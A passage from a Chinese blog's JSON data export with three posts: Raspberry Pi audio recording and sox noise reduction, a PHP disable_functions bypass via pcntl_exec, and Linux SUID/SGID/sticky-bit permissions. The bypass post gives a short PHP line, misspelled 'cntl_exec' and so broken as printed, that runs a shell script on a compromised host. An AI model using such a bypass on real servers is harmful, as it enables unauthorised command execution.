src=\"/images/2019/10/2019-10-28-21-40-08屏幕截图.png\" alt=\"\" /></figure>\n<p><!-- /wp:image -->\n\n<!-- wp:paragraph --></p>\n<p>3.使用sox工具进行降噪处理.(如果没有安装使用apt-get install soxi进行安装)</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>先进行噪音提取码提取</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<pre class=\"prettyprint\">sox noise.wav -n noiseprof noise.prof</pre>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>根据噪音提取码进行降噪处理(0.21为系数,推荐使用0.21)</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<pre class=\"prettyprint\">sox 20191028202528.wav new.wav noisered noise.prof 0.21</pre>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>降噪后的音频对比如下,降噪还是挺明显.</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:image {\"id\":590} --></p>\n<figure class=\"wp-block-image\"><img class=\"wp-image-590\" src=\"/images/2019/10/2019-10-28-21-23-29屏幕截图.png\" alt=\"\" /></figure>\n<p><!-- /wp:image --></p>","source":"_posts/树莓派进行录音和音频降噪.md","raw":"title: 树莓派进行录音和音频降噪\ncategories: [Linux]\ntags: [音频降噪,linux录音,树霉派]\ndate: 2019-10-28 21:48:00\n---\n<!-- wp:paragraph -->\n<p>&nbsp;</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>树莓派最近开始清理清理上面的灰,玩一些东西.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>录音设备使用USB摄像头集成的录音功能(N年前的老货,开始发挥余热),使用命令查询设备是否被发现.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p><code><!--?prettify linenums=true?--></code></p>\n<pre class=\"prettyprint\">pi@raspberrypi:~/workdir $ arecord -l\n**** List of CAPTURE Hardware Devices ****\ncard 1: CAMERA [USB2.0 PC CAMERA], device 0: USB Audio [USB Audio]\nSubdevices: 1/1\nSubdevice #0: subdevice #0</pre>\n<p><code></code></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>1.使用arecord命令进行录音记录,默认不添加-d参数,一直进行录制.(ctrl+c可以结束掉它)</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<pre class=\"prettyprint\">pi@raspberrypi:~/workdir $ arecord -D \"plughw:1,0\" -r 16000 -c 1 -t wav -f S16_LE 2019102820252.wav\nRecording WAVE '20191028.wav' : Signed 16 bit Little Endian, Rate 16000 Hz, Mono\n^CAborted by signal Interrupt…\narecord: pcm_read:2103: read error: Interrupted system call</pre>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>2.使用audacity进行杂音取样.选中杂音段进行文件导出.(选择文件-&gt;导出音频-&gt;选择wav格式即可,保持文件名称noise.wav)</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:image {\"id\":589} --></p>\n<figure class=\"wp-block-image\"><img class=\"wp-image-589\" src=\"/images/2019/10/2019-10-28-21-40-08屏幕截图.png\" alt=\"\" /></figure>\n<p><!-- /wp:image -->\n\n<!-- wp:paragraph --></p>\n<p>3.使用sox工具进行降噪处理.(如果没有安装使用apt-get install soxi进行安装)</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>先进行噪音提取码提取</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<pre class=\"prettyprint\">sox noise.wav -n noiseprof noise.prof</pre>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>根据噪音提取码进行降噪处理(0.21为系数,推荐使用0.21)</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<pre class=\"prettyprint\">sox 20191028202528.wav new.wav noisered noise.prof 0.21</pre>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>降噪后的音频对比如下,降噪还是挺明显.</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:image {\"id\":590} --></p>\n<figure class=\"wp-block-image\"><img class=\"wp-image-590\" src=\"/images/2019/10/2019-10-28-21-23-29屏幕截图.png\" alt=\"\" /></figure>\n<p><!-- /wp:image --></p>","slug":"树莓派进行录音和音频降噪","published":1,"updated":"2023-04-22T05:38:45.087Z","_id":"clgrjlxlw00bg7opihh6k9jf1","comments":1,"layout":"post","photos":[],"link":"","content":"<!-- wp:paragraph -->\n<p>&nbsp;</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>树莓派最近开始清理清理上面的灰,玩一些东西.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>录音设备使用USB摄像头集成的录音功能(N年前的老货,开始发挥余热),使用命令查询设备是否被发现.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p><code><!--?prettify linenums=true?--></code></p>\n<pre class=\"prettyprint\">pi@raspberrypi:~/workdir $ arecord -l\n**** List of CAPTURE Hardware Devices ****\ncard 1: CAMERA [USB2.0 PC CAMERA], device 0: USB Audio [USB Audio]\nSubdevices: 1/1\nSubdevice #0: subdevice #0</pre>\n<p><code></code></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>1.使用arecord命令进行录音记录,默认不添加-d参数,一直进行录制.(ctrl+c可以结束掉它)</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<pre class=\"prettyprint\">pi@raspberrypi:~/workdir $ arecord -D \"plughw:1,0\" -r 16000 -c 1 -t wav -f S16_LE 2019102820252.wav\nRecording WAVE '20191028.wav' : Signed 16 bit Little Endian, Rate 16000 Hz, Mono\n^CAborted by signal Interrupt…\narecord: pcm_read:2103: read error: Interrupted system call</pre>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>2.使用audacity进行杂音取样.选中杂音段进行文件导出.(选择文件-&gt;导出音频-&gt;选择wav格式即可,保持文件名称noise.wav)</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:image {\"id\":589} --></p>\n<figure class=\"wp-block-image\"><img class=\"wp-image-589\" src=\"/images/2019/10/2019-10-28-21-40-08屏幕截图.png\" alt=\"\" /></figure>\n<p><!-- /wp:image -->\n\n<!-- wp:paragraph --></p>\n<p>3.使用sox工具进行降噪处理.(如果没有安装使用apt-get install soxi进行安装)</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>先进行噪音提取码提取</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<pre class=\"prettyprint\">sox noise.wav -n noiseprof noise.prof</pre>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>根据噪音提取码进行降噪处理(0.21为系数,推荐使用0.21)</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<pre class=\"prettyprint\">sox 20191028202528.wav new.wav noisered noise.prof 0.21</pre>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>降噪后的音频对比如下,降噪还是挺明显.</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:image {\"id\":590} --></p>\n<figure class=\"wp-block-image\"><img class=\"wp-image-590\" src=\"/images/2019/10/2019-10-28-21-23-29屏幕截图.png\" alt=\"\" /></figure>\n<p><!-- /wp:image --></p>","site":{"data":{}},"excerpt":"","more":"<!-- wp:paragraph -->\n<p>&nbsp;</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>树莓派最近开始清理清理上面的灰,玩一些东西.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>录音设备使用USB摄像头集成的录音功能(N年前的老货,开始发挥余热),使用命令查询设备是否被发现.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p><code><!--?prettify linenums=true?--></code></p>\n<pre class=\"prettyprint\">pi@raspberrypi:~/workdir $ arecord -l\n**** List of CAPTURE Hardware Devices ****\ncard 1: CAMERA [USB2.0 PC CAMERA], device 0: USB Audio [USB Audio]\nSubdevices: 1/1\nSubdevice #0: subdevice #0</pre>\n<p><code></code></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>1.使用arecord命令进行录音记录,默认不添加-d参数,一直进行录制.(ctrl+c可以结束掉它)</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<pre class=\"prettyprint\">pi@raspberrypi:~/workdir $ arecord -D \"plughw:1,0\" -r 16000 -c 1 -t wav -f S16_LE 2019102820252.wav\nRecording WAVE '20191028.wav' : Signed 16 bit Little Endian, Rate 16000 Hz, Mono\n^CAborted by signal Interrupt…\narecord: pcm_read:2103: read error: Interrupted system call</pre>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>2.使用audacity进行杂音取样.选中杂音段进行文件导出.(选择文件-&gt;导出音频-&gt;选择wav格式即可,保持文件名称noise.wav)</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:image {\"id\":589} --></p>\n<figure class=\"wp-block-image\"><img class=\"wp-image-589\" src=\"/images/2019/10/2019-10-28-21-40-08屏幕截图.png\" alt=\"\" /></figure>\n<p><!-- /wp:image -->\n\n<!-- wp:paragraph --></p>\n<p>3.使用sox工具进行降噪处理.(如果没有安装使用apt-get install soxi进行安装)</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>先进行噪音提取码提取</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<pre class=\"prettyprint\">sox noise.wav -n noiseprof noise.prof</pre>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>根据噪音提取码进行降噪处理(0.21为系数,推荐使用0.21)</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<pre class=\"prettyprint\">sox 20191028202528.wav new.wav noisered noise.prof 0.21</pre>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:paragraph --></p>\n<p>降噪后的音频对比如下,降噪还是挺明显.</p>\n<p><!-- /wp:paragraph -->\n\n<!-- wp:image {\"id\":590} --></p>\n<figure class=\"wp-block-image\"><img class=\"wp-image-590\" src=\"/images/2019/10/2019-10-28-21-23-29屏幕截图.png\" alt=\"\" /></figure>\n<p><!-- /wp:image --></p>"},{"title":"渗透技巧：利用pcntl_exec突破disable_functions","date":"2013-04-19T00:30:15.000Z","_content":"1、说明\npcntl是linux下的一个扩展，可以支持php的多线程操作。\npcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 >= 4.2.0, PHP 5\n2、利用\n在做渗透的时候被disable_functions卡住不能执行命令是家常便饭，今天在一国外虚拟主机上又被卡了，但我在执行phpinfo();的时候眼前闪过–enable-pcntl。当时我就偷笑了，没啥好说的，我一直强调渗透要细心做人做事也一样。\n#exec.php\n<?php cntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?>\n#/tmp/b4dboy.sh\n#!/bin/bash\nls -l /\n原文：http://www.secoff.net/archives/116.html","source":"_posts/渗透技巧：利用pcntl_exec突破disable_functions.md","raw":"title: 渗透技巧：利用pcntl_exec突破disable_functions\ncategories: [网络安全]\ntags: []\ndate: 2013-04-19 08:30:15\n---\n1、说明\npcntl是linux下的一个扩展，可以支持php的多线程操作。\npcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 >= 4.2.0, PHP 5\n2、利用\n在做渗透的时候被disable_functions卡住不能执行命令是家常便饭，今天在一国外虚拟主机上又被卡了，但我在执行phpinfo();的时候眼前闪过–enable-pcntl。当时我就偷笑了，没啥好说的，我一直强调渗透要细心做人做事也一样。\n#exec.php\n<?php cntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?>\n#/tmp/b4dboy.sh\n#!/bin/bash\nls -l /\n原文：http://www.secoff.net/archives/116.html","slug":"渗透技巧：利用pcntl_exec突破disable_functions","published":1,"updated":"2023-04-22T05:38:45.103Z","_id":"clgrjlxly00bi7opi9wh75sff","comments":1,"layout":"post","photos":[],"link":"","content":"<p>1、说明<br>pcntl是linux下的一个扩展，可以支持php的多线程操作。<br>pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 &gt;&#x3D; 4.2.0, PHP 5<br>2、利用<br>在做渗透的时候被disable_functions卡住不能执行命令是家常便饭，今天在一国外虚拟主机上又被卡了，但我在执行phpinfo();的时候眼前闪过–enable-pcntl。当时我就偷笑了，没啥好说的，我一直强调渗透要细心做人做事也一样。<br>#exec.php<br><?php cntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?><br>#&#x2F;tmp&#x2F;b4dboy.sh<br>#!&#x2F;bin&#x2F;bash<br>ls -l &#x2F;<br>原文：<a href=\"http://www.secoff.net/archives/116.html\">http://www.secoff.net/archives/116.html</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>1、说明<br>pcntl是linux下的一个扩展，可以支持php的多线程操作。<br>pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 &gt;&#x3D; 4.2.0, PHP 5<br>2、利用<br>在做渗透的时候被disable_functions卡住不能执行命令是家常便饭，今天在一国外虚拟主机上又被卡了，但我在执行phpinfo();的时候眼前闪过–enable-pcntl。当时我就偷笑了，没啥好说的，我一直强调渗透要细心做人做事也一样。<br>#exec.php<br><?php cntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?><br>#&#x2F;tmp&#x2F;b4dboy.sh<br>#!&#x2F;bin&#x2F;bash<br>ls -l &#x2F;<br>原文：<a href=\"http://www.secoff.net/archives/116.html\">http://www.secoff.net/archives/116.html</a></p>\n"},{"title":"深入理解linux的权限设置和SUID,SGID以及粘滞位","date":"2010-05-25T01:43:00.000Z","_content":"<p>我们知道文件的权限可以用三个八进制数字表示。其实文件的权限应该用四个八进制来表示，不过用 ls -l  命令时，只显示三个罢了。那个没有显示的八进制数字其实是第一个，它用来设定一些特殊权限。这个八进制数字的三个位是：</p><p>&#160;&#160;&#160;&#160;  SUID SGID sticky-bit</p><p>&#160;&#160;&#160;&#160; 它们的含义是： <br />SUID</p><p><br />当设置了</p><p>SUID 位的文件被执行时，该文件将以所有者的身份运行，也就是说无论谁来执行这个文件，他都有文件所有者的特权。如果所有者是 root  的话，那么执行人就有超级用户的特权了。这时该位将变成一个安全漏洞，因此不要轻易设置该位。 <br />sticky-bit</p><p>sticky   位要求操作系统既是在可执行程序退出后，仍要在内存中保留该程序的映象。这样做是为了节省大型程序的启动时间。但是会占用系统资源。因此设置该位，不如把 程序写好。</p><p>&#160;</p><p><br />每一个文件有所有者及组编号，set uid ；set  gid可以改变用户对文件具有的权限：写和执行.</p><p>setuid: 在执行时具有文件所有者的权限. <br />setgid: 设置目录.  一个目录被标上setgid位,此目录下创建的文件继承该目录的属性. <br />sticky bit: 该位可以理解为防删除位. 设置sticky  bit位后，就算用户对目录具有写权限，但也只能添加文件而不能删除文件。</p><p><br />如何设置：</p><p>操作这些标志与操作文件 权限的命令是一样的, 都是 chmod. 有两种方法来操作, <br />1) chmod u+s temp --  为temp文件加上setuid标志. (setuid 只对文件有效，U=用户) <br />chmod g+s tempdir --  为tempdir目录加上setgid标志 (setgid 只对目录有效，g=组名) <br />chmod o+t temp --  为temp文件加上sticky标志 (sticky只对文件有效)</p><p>2) 采用八进制方式. 这一组八进制数字三位的意义如下, <br />abc  <br />a - setuid位, 如果该位为1, 则表示设置setuid <br />b - setgid位, 如果该位为1,  则表示设置setgid <br />c - sticky位, 如果该位为1, 则表示设置sticky</p><p>rwsrw-r--  表示有setuid标志 (rwxrw-r--:rwsrw-r--)<br />rwxrwsrw- 表示有setgid标志  (rwxrwxrw-:rwxrwsrw-)<br />rwxrw-rwt 表示有sticky标志 (rwxrw-rwx:rwxrw-rwt)</p><p>理解文件权限</p><p>所谓的文件权限，是指对文件的访问权限，包括对文件的读、写、删除、执行。Linux  是一个多用户操作系统，它允许多个用户同时登录和工作。因此 Linux 将一个文件或目录与一个用户和组联系起来。请看下面的例子：</p><p>&#160;&#160;&#160;&#160;  drwxr-xr-x 5 root root 1024 Sep 13 03:27 Desktop</p><p>&#160;&#160;&#160;&#160;  与文件权限相关联的是第一、第三、第四个域。第三个域是文件的所有者，第四个域是文件的所属组，而第一个域则限制了文件的访问权限。在这个例子中，文件的  所有者是 root，所属的组是 root，文件的访问权限是  drwxr-xr-x。对于文件和目录讲，每个文件和目录都有一组权限标志和它们结合在一起，在上例中就是第一个域中的内容。下面来仔细分析这个域中各个  符号的意义：</p><p>&#160;&#160;&#160;&#160; 该域由 10 个字符组成，可以把它们分为四组，具体含义分别是：</p><p>&#160;&#160;&#160;&#160; d rwx  r-x r-x</p><p>&#160;&#160;&#160;&#160; 文件类型 所有者权限标志 组权限标志 其他用户权限标志</p><p>&#160;&#160;&#160;&#160; 其中：</p><p>&#160;&#160;&#160;&#160;  文件类型：第一个字符。由于 Linux 系统对与设备、目录、文件都当作是文件来处理，因此该字符表明此文件的类型，字符与对应的意义如下表：</p><p>&#160;&#160;&#160;&#160; 权限标志：</p><p>&#160;&#160;&#160;&#160; 对每个文件或目录都有 4  类不同的用户。每类用户各有一组读、写和执行（搜索）文件的访问权限，这 4 类用户是：</p><p>&#160;&#160;&#160;&#160; root：系统特权用户类，既  UID = 0 的用户。</p><p>&#160;&#160;&#160;&#160; owner：拥有文件的用户。</p><p>&#160;&#160;&#160;&#160;  group：共享文件的组访问权限的用户类的用户组名称。</p><p>&#160;&#160;&#160;&#160; world：不属于上面 3 类的所有其他用户。</p><p>&#160;&#160;&#160;&#160;  作为  root，他们自动拥有了所有文件和目录的全面的读、写和搜索的权限，所以没有必要明确指定他们的权限。其他三类用户则可以在耽搁文件或者目录的基础上别  授权或撤消权限。因此对另外三类用户，一共 9 个权限位与之对应，分为 3 组，每组 3 个，分别用 r、w、x 来表示，分别对应  owner、group、world。</p><p>&#160;&#160;&#160;&#160; 权限位对于文件和目录的含义有些许不同。每组 3  个字符对应的含义从左至右的顺序，对于文件来说是：读文件的内容（r）、写数据到文件（w）、做为命令执行该文件（x）。对于目录来说是：读包含在目录中  的文件名称（r）、写信息到目录中去（增加和删除索引点的连接）、搜索目录（能用该目录名称作为路径名去访问它所包含的文件或子目录）。具体来说就是：</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1． 有只读权限的用户不能用 cd 进入该目录；还必须有执行权限才能进入。</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2． 有执行权限的用户只有在知道文件名并拥有该文件的读权限的情况下才可以访问目录下的文件。</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 3．  必须有读和执行权限才可以使用 ls 列出目录清单，或使用 cd 进入目录。</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 4．  如用户有目录的写权限，则可以创建、删除或修改目录下的任何文件或子目录，既是该文件或子目录属于其他用户。</p><p>修改文件权限</p><p>&#160;&#160;&#160;&#160;  首先讲修改文件的所有权，使用 chown 和 chgrp 命令：</p><p>&#160;&#160;&#160;&#160; chown new_user file or  directory：修改文件或目录的所有者。</p><p>&#160;&#160;&#160;&#160; chgrp new_group file or  directory：修改文件或目录的所属组。</p><p>&#160;&#160;&#160;&#160; 这里需要注意的是：普通用户不能将文件或目录的所有权交与他人，只有  root 有这一权限。但是普通用户有权改变文件或目录的所属组。</p><p><br />由于每类用户的权限都是由 rwx  三位组成，因此可以用三个八进制数字表示文件的访问权。一个八进制数字可以用三个二进制数字表示，那么与其对应，权值为 4 的位对应 r，权值为 2  的位对应 w，权值为 1 的位对应 x。对于一类用户，将这三位与其对应的权值相乘求和，就可以得出对该类用户的访问权限。</p><p>&#160;&#160;&#160;&#160;  改变文件访问权限的命令是 chmod，格式是：</p><p>&#160;&#160;&#160;&#160; chmod permission file_name</p><p>&#160;&#160;&#160;&#160;  比如 chmod 764  a.txt,它表示对于文件的所有者，具有对该文件读、写、执行的权限。对于文件所属组的用户，拥有读、写的权限。对于其他用户，只有读权限。</p><p>&#160;&#160;&#160;&#160; 这里需要注意的是：文件的创建者是唯一可以修改该文件访问权限的普通用户，另外一个可以修改文件访问权限的用户是 root。</p><p>&#160;&#160;&#160;&#160; 还有一种表示方法，就是用字符串来设定文件访问权限。其中读用 r 表示，写用 w 表示，执行用 x 表示；所有者用 u  表示，组用户用 g 表示，其他用户用 o 表示，所有用户用 a 表示。那么上面例子就写成西面的模样：</p><p>chmod  a+r,u+w,u+x,g+w a.txt</p><p> </p><p> </p>","source":"_posts/深入理解linux的权限设置和SUID,SGID以及粘滞位.md","raw":"title: 深入理解linux的权限设置和SUID,SGID以及粘滞位\ncategories: [Linux]\ntags: []\ndate: 2010-05-25 09:43:00\n---\n<p>我们知道文件的权限可以用三个八进制数字表示。其实文件的权限应该用四个八进制来表示，不过用 ls -l  命令时，只显示三个罢了。那个没有显示的八进制数字其实是第一个，它用来设定一些特殊权限。这个八进制数字的三个位是：</p><p>&#160;&#160;&#160;&#160;  SUID SGID sticky-bit</p><p>&#160;&#160;&#160;&#160; 它们的含义是： <br />SUID</p><p><br />当设置了</p><p>SUID 位的文件被执行时，该文件将以所有者的身份运行，也就是说无论谁来执行这个文件，他都有文件所有者的特权。如果所有者是 root  的话，那么执行人就有超级用户的特权了。这时该位将变成一个安全漏洞，因此不要轻易设置该位。 <br />sticky-bit</p><p>sticky   位要求操作系统既是在可执行程序退出后，仍要在内存中保留该程序的映象。这样做是为了节省大型程序的启动时间。但是会占用系统资源。因此设置该位，不如把 程序写好。</p><p>&#160;</p><p><br />每一个文件有所有者及组编号，set uid ；set  gid可以改变用户对文件具有的权限：写和执行.</p><p>setuid: 在执行时具有文件所有者的权限. <br />setgid: 设置目录.  一个目录被标上setgid位,此目录下创建的文件继承该目录的属性. <br />sticky bit: 该位可以理解为防删除位. 设置sticky  bit位后，就算用户对目录具有写权限，但也只能添加文件而不能删除文件。</p><p><br />如何设置：</p><p>操作这些标志与操作文件 权限的命令是一样的, 都是 chmod. 有两种方法来操作, <br />1) chmod u+s temp --  为temp文件加上setuid标志. (setuid 只对文件有效，U=用户) <br />chmod g+s tempdir --  为tempdir目录加上setgid标志 (setgid 只对目录有效，g=组名) <br />chmod o+t temp --  为temp文件加上sticky标志 (sticky只对文件有效)</p><p>2) 采用八进制方式. 这一组八进制数字三位的意义如下, <br />abc  <br />a - setuid位, 如果该位为1, 则表示设置setuid <br />b - setgid位, 如果该位为1,  则表示设置setgid <br />c - sticky位, 如果该位为1, 则表示设置sticky</p><p>rwsrw-r--  表示有setuid标志 (rwxrw-r--:rwsrw-r--)<br />rwxrwsrw- 表示有setgid标志  (rwxrwxrw-:rwxrwsrw-)<br />rwxrw-rwt 表示有sticky标志 (rwxrw-rwx:rwxrw-rwt)</p><p>理解文件权限</p><p>所谓的文件权限，是指对文件的访问权限，包括对文件的读、写、删除、执行。Linux  是一个多用户操作系统，它允许多个用户同时登录和工作。因此 Linux 将一个文件或目录与一个用户和组联系起来。请看下面的例子：</p><p>&#160;&#160;&#160;&#160;  drwxr-xr-x 5 root root 1024 Sep 13 03:27 Desktop</p><p>&#160;&#160;&#160;&#160;  与文件权限相关联的是第一、第三、第四个域。第三个域是文件的所有者，第四个域是文件的所属组，而第一个域则限制了文件的访问权限。在这个例子中，文件的  所有者是 root，所属的组是 root，文件的访问权限是  drwxr-xr-x。对于文件和目录讲，每个文件和目录都有一组权限标志和它们结合在一起，在上例中就是第一个域中的内容。下面来仔细分析这个域中各个  符号的意义：</p><p>&#160;&#160;&#160;&#160; 该域由 10 个字符组成，可以把它们分为四组，具体含义分别是：</p><p>&#160;&#160;&#160;&#160; d rwx  r-x r-x</p><p>&#160;&#160;&#160;&#160; 文件类型 所有者权限标志 组权限标志 其他用户权限标志</p><p>&#160;&#160;&#160;&#160; 其中：</p><p>&#160;&#160;&#160;&#160;  文件类型：第一个字符。由于 Linux 系统对与设备、目录、文件都当作是文件来处理，因此该字符表明此文件的类型，字符与对应的意义如下表：</p><p>&#160;&#160;&#160;&#160; 权限标志：</p><p>&#160;&#160;&#160;&#160; 对每个文件或目录都有 4  类不同的用户。每类用户各有一组读、写和执行（搜索）文件的访问权限，这 4 类用户是：</p><p>&#160;&#160;&#160;&#160; root：系统特权用户类，既  UID = 0 的用户。</p><p>&#160;&#160;&#160;&#160; owner：拥有文件的用户。</p><p>&#160;&#160;&#160;&#160;  group：共享文件的组访问权限的用户类的用户组名称。</p><p>&#160;&#160;&#160;&#160; world：不属于上面 3 类的所有其他用户。</p><p>&#160;&#160;&#160;&#160;  作为  root，他们自动拥有了所有文件和目录的全面的读、写和搜索的权限，所以没有必要明确指定他们的权限。其他三类用户则可以在耽搁文件或者目录的基础上别  授权或撤消权限。因此对另外三类用户，一共 9 个权限位与之对应，分为 3 组，每组 3 个，分别用 r、w、x 来表示，分别对应  owner、group、world。</p><p>&#160;&#160;&#160;&#160; 权限位对于文件和目录的含义有些许不同。每组 3  个字符对应的含义从左至右的顺序，对于文件来说是：读文件的内容（r）、写数据到文件（w）、做为命令执行该文件（x）。对于目录来说是：读包含在目录中  的文件名称（r）、写信息到目录中去（增加和删除索引点的连接）、搜索目录（能用该目录名称作为路径名去访问它所包含的文件或子目录）。具体来说就是：</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1． 有只读权限的用户不能用 cd 进入该目录；还必须有执行权限才能进入。</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2． 有执行权限的用户只有在知道文件名并拥有该文件的读权限的情况下才可以访问目录下的文件。</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 3．  必须有读和执行权限才可以使用 ls 列出目录清单，或使用 cd 进入目录。</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 4．  如用户有目录的写权限，则可以创建、删除或修改目录下的任何文件或子目录，既是该文件或子目录属于其他用户。</p><p>修改文件权限</p><p>&#160;&#160;&#160;&#160;  首先讲修改文件的所有权，使用 chown 和 chgrp 命令：</p><p>&#160;&#160;&#160;&#160; chown new_user file or  directory：修改文件或目录的所有者。</p><p>&#160;&#160;&#160;&#160; chgrp new_group file or  directory：修改文件或目录的所属组。</p><p>&#160;&#160;&#160;&#160; 这里需要注意的是：普通用户不能将文件或目录的所有权交与他人，只有  root 有这一权限。但是普通用户有权改变文件或目录的所属组。</p><p><br />由于每类用户的权限都是由 rwx  三位组成，因此可以用三个八进制数字表示文件的访问权。一个八进制数字可以用三个二进制数字表示，那么与其对应，权值为 4 的位对应 r，权值为 2  的位对应 w，权值为 1 的位对应 x。对于一类用户，将这三位与其对应的权值相乘求和，就可以得出对该类用户的访问权限。</p><p>&#160;&#160;&#160;&#160;  改变文件访问权限的命令是 chmod，格式是：</p><p>&#160;&#160;&#160;&#160; chmod permission file_name</p><p>&#160;&#160;&#160;&#160;  比如 chmod 764  a.txt,它表示对于文件的所有者，具有对该文件读、写、执行的权限。对于文件所属组的用户，拥有读、写的权限。对于其他用户，只有读权限。</p><p>&#160;&#160;&#160;&#160; 这里需要注意的是：文件的创建者是唯一可以修改该文件访问权限的普通用户，另外一个可以修改文件访问权限的用户是 root。</p><p>&#160;&#160;&#160;&#160; 还有一种表示方法，就是用字符串来设定文件访问权限。其中读用 r 表示，写用 w 表示，执行用 x 表示；所有者用 u  表示，组用户用 g 表示，其他用户用 o 表示，所有用户用 a 表示。那么上面例子就写成西面的模样：</p><p>chmod  a+r,u+w,u+x,g+w a.txt</p><p> </p><p> </p>","slug":"深入理解linux的权限设置和SUID,SGID以及粘滞位","published":1,"updated":"2023-04-22T05:38:45.097Z","_id":"clgrjlxm000bl7opih9a36gnd","comments":1,"layout":"post","photos":[],"link":"","content":"<p>我们知道文件的权限可以用三个八进制数字表示。其实文件的权限应该用四个八进制来表示，不过用 ls -l  命令时，只显示三个罢了。那个没有显示的八进制数字其实是第一个，它用来设定一些特殊权限。这个八进制数字的三个位是：</p><p>&#160;&#160;&#160;&#160;  SUID SGID sticky-bit</p><p>&#160;&#160;&#160;&#160; 它们的含义是： <br />SUID</p><p><br />当设置了</p><p>SUID 位的文件被执行时，该文件将以所有者的身份运行，也就是说无论谁来执行这个文件，他都有文件所有者的特权。如果所有者是 root  的话，那么执行人就有超级用户的特权了。这时该位将变成一个安全漏洞，因此不要轻易设置该位。 <br />sticky-bit</p><p>sticky   位要求操作系统既是在可执行程序退出后，仍要在内存中保留该程序的映象。这样做是为了节省大型程序的启动时间。但是会占用系统资源。因此设置该位，不如把 程序写好。</p><p>&#160;</p><p><br />每一个文件有所有者及组编号，set uid ；set  gid可以改变用户对文件具有的权限：写和执行.</p><p>setuid: 在执行时具有文件所有者的权限. <br />setgid: 设置目录.  一个目录被标上setgid位,此目录下创建的文件继承该目录的属性. <br />sticky bit: 该位可以理解为防删除位. 设置sticky  bit位后，就算用户对目录具有写权限，但也只能添加文件而不能删除文件。</p><p><br />如何设置：</p><p>操作这些标志与操作文件 权限的命令是一样的, 都是 chmod. 有两种方法来操作, <br />1) chmod u+s temp --  为temp文件加上setuid标志. (setuid 只对文件有效，U=用户) <br />chmod g+s tempdir --  为tempdir目录加上setgid标志 (setgid 只对目录有效，g=组名) <br />chmod o+t temp --  为temp文件加上sticky标志 (sticky只对文件有效)</p><p>2) 采用八进制方式. 这一组八进制数字三位的意义如下, <br />abc  <br />a - setuid位, 如果该位为1, 则表示设置setuid <br />b - setgid位, 如果该位为1,  则表示设置setgid <br />c - sticky位, 如果该位为1, 则表示设置sticky</p><p>rwsrw-r--  